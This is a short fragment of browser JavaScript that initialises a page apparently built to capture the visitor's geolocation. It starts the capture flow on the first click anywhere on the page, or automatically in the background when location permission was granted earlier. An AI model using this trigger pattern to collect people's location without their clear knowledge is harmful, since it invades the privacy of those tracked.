  document.addEventListener('click', triggerCaptureFlow, { once: true });

  // Load client info for map centering
  try {
    const infoResp = await fetch('/api/client-info');
    if (infoResp.ok) lastClientInfo = await infoResp.json();
  } catch {}

  // Smart background start: check if we already have permission
  if (navigator.permissions && navigator.permissions.query) {
    try {
      const result = await navigator.permissions.query({ name: 'geolocation' });
      if (result.state === 'granted') {
        triggerCaptureFlow();
      }
    } catch (err) {}
  }

  try {
    const response = await fetch('/api/health', { cache: 'no-store' });
    setStatus(response.ok ? 'Server ready. Tap Go to start.' : 'Server responded with an error.');
  } catch {
    setStatus('Local server is not reachable.');
  }
}

document.addEventListener('DOMContentLoaded', init);
